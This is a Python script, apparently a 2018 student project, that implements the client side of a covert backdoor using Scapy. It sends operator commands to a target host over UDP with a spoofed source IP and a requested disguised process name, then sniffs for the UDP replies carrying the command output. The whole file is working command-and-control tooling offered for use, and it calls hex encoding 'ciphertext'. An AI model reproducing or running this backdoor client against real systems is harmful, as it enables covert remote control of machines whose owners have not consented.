#!/usr/bin/python3


import argparse
import logging
import binascii
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from binascii import hexlify
import setproctitle

'''
Function:       sendData(dstIp, data, title, sourceIp)

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this file is to send the packet to the server. The data
that's being passed through is the destinatinon IP, along with the command,
the process name that the client wants on the server, and the spoofed IP. It
encodes all the information before sending it off to the destinaton IP and port.
'''

def sendData(dstIp, data, title, sourceIp):
    info = title +"\"" + data
    ciphertext = hexlify(info.encode("utf8"))
    pkt = IP(src=sourceIp, dst=dstIp)/UDP(dport=8000, sport=8505)/ciphertext
    send(pkt, verbose=0)


'''
Function:       readPacket(pkt)

Programmer:     Yiaoping

Date:           October 15th 2018

Notes: The purpose of this file is read the packet. If there isn't an ARP
in the packet, it loads the packet for reading. We decode the packet and 
print the contents of the packet to the screen for user.
'''
def readPacket(pkt):
    
    if ARP not in pkt:
        data = pkt["Raw"].load
        #print(data)
        message = binascii.unhexlify(data)
        print (message.decode())

    return

'''
Function:       main()

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this file is to process all user arguments and take in the command
that the user wants the server to perform. It also is continously sniffing for packets 
coming in that are meant for the client. Once the packets are received, it sends it to
the readPacket() function to be parsed.
'''
def main():
    parser = argparse.ArgumentParser(description='Client backdoor')
    parser.add_argument('-d', '--dest', dest='dst_ip', help='target IP', required=True)
    parser.add_argument('-t', '--title', dest='ptitle', help='process title', required=True)
    parser.add_argument('-s', '--sourceIp', dest='sourceIp', help='source IP', required = False)
    args = parser.parse_args()
    

    while 1:
        command = input("Enter Command: ")
        sendData(args.dst_ip, command, args.ptitle, args.sourceIp)
        if command == ("quit"):
            exit()
        sniff(filter="udp and dst port 8505 and src port 8000", prn=readPacket, count=1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')
